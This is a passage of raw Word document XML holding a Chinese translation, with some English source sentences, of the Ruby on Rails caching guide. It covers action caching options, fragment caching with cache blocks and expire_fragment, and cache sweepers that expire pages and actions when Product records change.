        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionCachePath.path_for</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 。这便于有多个路由的 action 做不同的缓存。如果传递一个块，将会被当前的控制器实例调用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="736527C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最后，如果使用 memcached 或 Ehcache ，可以传值到 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:expires_in</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 。事实上所有不被 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>caches_action</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 使用的参数都发送到了底层的缓存存储。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AB4B96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Action 缓存在 after filter 中运行。这样，只要你中断无效的请求，它将不会产生伪造的缓存纪录。通常在一些检验请求的 before filter 中的跳转会做这项工作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5239FE89"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1.3 片段缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15E69E3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如果可以通过缓存整个页面或 action 来处理所有的问题那就完美了。但是动态的 web 应用程序通常会用不同的部分来构成页面，这些不同的部分并不都是使用完全相同的缓存配置。为了处理一个不同部分需要不同的缓存和失效时间的动态创建的页 面， Rails 提供了片段缓存的机制。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B518D8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Fragment Caching allows a fragment of view logic to be wrapped in a cache block and served out of the cache store when the next request comes in.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12AE9E0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片段缓存允许一个逻辑视图的片段放在一个缓存块中，在下一个请求时就可以直接使用缓存存储。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FF1384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As an example, if you wanted to show all the orders placed on your website in real time and didn’t want to cache that part of the page, but did want to cache the part of the page which lists all products available, you could use this piece of code:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7409BFE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举个例子，你想要在网站上实时的显示所有的订单，不想缓存页面上的这一部分，但是想缓存页面上显示所有产品的那一部分，可以这样写你的代码：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6240"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="0A0EDCC3" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3515051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 Order.find_recent.each</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|o| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0272534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 o.buyer.name %&gt; bought &lt;%= o.product.name %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76F081A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 end</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03AC02B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78F05BA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 cache do</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37F7F7B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All available products:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3EE72B9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 Product.all.each</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|p| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="457FAF8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 link_to p.name, product_url(p) %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E7D6A9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 end</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3C6F049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 end</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7737CD2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例子中的缓存块将会绑定到调用它的 action ，之后会将缓存写在和 Action 缓存的相同位置。所以如果你想为每个 action 缓存多个片段，你应该在 cache 调用时提供 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>action_suffix</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>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8280"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="769EEED6" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="32C6205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 cache(:action</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'recent', :action_suffix</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'all_products') do</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75D48FD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All available products:</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4A3D8FB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同时可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>expire_fragment</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法来使缓存失效：</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01ADD863" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="36C01336" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="278486622"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>expire_fragment(:controller</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'products', :action</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'recent', :action_suffix</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'all_products')</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0552F24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如果不希望缓存块绑定到所调用的 action ，可以通过调用加上一个关键字的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>cache</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法使用全局片段：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4800"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="530A1DA9" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5A2677D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 cache('all_available_products') do</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10D0A4A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All available products:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F4A5E2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 end</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4620B80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这个片段可以在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ProductionsController</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的所有 action 中使用。使用关键字，再以同样的方式使它失效：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4920"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="056BDB5D" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7040EA5D" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1952471910"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>expire_fragment('all_available_products')</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="15CB2FB7"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1.4 清理器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EF24A6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Cache 清理是让你在代码里避免调用一大堆 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>expire_{page,action,fragmeng}</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法的机制。它把所有需要是缓存内容失效的工作移到了 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionController::Caching::Sweeper</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的子类中。这个类是一个观察器，通过回调来查询一个对象的变化，当变化发生时，就会在 around 或 after filter 中将该对象缓存的相关内容失效。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="201D6A3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继续 Product controller 的例子，可以在清理器中这样处理：</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0BA5D921" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="237FE80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ProductSweeper &lt; ActionController::Caching::Sweeper</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CF4B1D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observe Product # This sweeper is going to keep an eye on the Product model</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5257CE3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0D8EDB8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If our sweeper detects that a Product was created call this</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C89028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after_create(product)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F32636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expire_cache_for(product)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B1D7F3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35A6AF1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5698935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If our sweeper detects that a Product was updated call this</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36589BF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after_update(product)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0063164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expire_cache_for(product)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="745ACF0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5AC5179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5626A7D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If our sweeper detects that a Product was deleted call this</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2401AE7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after_destroy(product)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F8F9A8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expire_cache_for(product)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7328BBF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7CC0853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00C2902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private</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4320080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expire_cache_for(product)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3EE187D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Expire the index page now that we added a new product</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D24C2A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expire_page(:controller</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'products', :action</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'index')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="364C7D6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2F7482B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Expire a fragment</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23C737D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expire_fragment('all_available_products')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2CB6F88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0268DAF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748789D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可能你注意到了实际的 product 传递到了清理器，如果对每一个 product 的 edit action 缓存，就可以加上一个对特定页面的失效方法：</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5D3B7754" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0EBF5563" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="295336241"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>expire_action(:controller</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'products', :action</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'edit', :id</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; product.id)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4D5DAC7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之后把它加到控制器中，来告知控制器当某个 action 调用时使用清理器。如果我们想在 create action 调用后，使列表和 edit action 的缓存内容失效，我们可以这样做：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5160"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="29EBA38F" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1DAEB1C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ProductsController &lt; ActionController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51E77AA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385A5F6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before_filter :authenticate</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E0B6F8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caches_action :index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17C257D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cache_sweeper :product_sweeper</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="15B0F68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40EE529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index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11E3318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@products</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Product.all</w:t>
            </w:r>
          </w:p>
